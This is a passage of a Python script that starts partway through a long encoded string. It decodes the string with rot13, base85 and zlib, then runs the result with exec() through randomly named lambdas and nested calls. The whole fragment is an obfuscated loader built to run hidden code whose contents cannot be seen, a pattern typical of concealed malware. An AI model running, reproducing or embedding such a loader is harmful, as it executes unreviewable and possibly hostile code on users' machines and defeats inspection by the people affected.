Kxz0N=3E8c8~zCgaEK7+?pp_pADd9Zkz$}q*0i{AeZ9dA}f3l5zNeDkhzo~?alWUJ4~MNP*)bNP<f5BpskkYy%ki~72Dy4lKY>3DT?ZW|(#b|^+1QzA;8l2Q|i12;A3R=CLQ%Zg~EAfkwM9h;i7jUuUe`lqf6?Kj5LR{W9L6l2M%41<c583l{auDL5BuxFh_j~09xe)7b1U#H8?LF{Q#^h5;q2usIF;J3EIGB{MXolIL~CF28Ds25J4yl34jr;i#h=|B=>B)J!C1Wl80w<2x*(r(tcLnhAutQm-*xM?YPB`N>;iH=n#gx-pB(UF@BYhDg|mD$5iVMcl2x-{M2L&;(+(wGA5O%Aj{Q}_i0`>boH&+d}7KE!zVa&@LBA@9iL(!;n)We2~pI-dGGKXnb}fNz7U?H=eJM#&F=s#>hQ1Ccsam`FBTMH}}!W7{nDG1{G5Ya{sY5Jj?9C%-u3ymSYWOmM5lS~<DgvHjWr(z~~xDEMufmwDTMMV0#?sG6A&)v<a%g;Rym8{CSXKf)xbb6bH`dzK~10G}IGw<!NhuE=$Zv9#a>-P(3JHG&a{x!wMu(rRW|r=-uY9Lg;#Sj<oVXL9~j2>a<Z9p5eZ91=0|4hmj=_O?ODB7j5IV4$+nC5-}&j0oy"

# Dynamic imports
_import_zlib = __import__('zlib')
_import_b85 = __import__('base64').b85decode
_import_rot13 = __import__('codecs').decode

zdCBfCKBSiDK = (lambda data: _import_zlib.decompress(_import_b85(_import_rot13(data, 'rot_13'))))
BuqoCHajCUCv = (lambda payload: exec(payload, {'__name__':'__main__'}))

# Nested execution
(lambda f: (lambda x: f(x))(NFFmgLrhihst))(
    lambda c: BuqoCHajCUCv(zdCBfCKBSiDK(c))
)
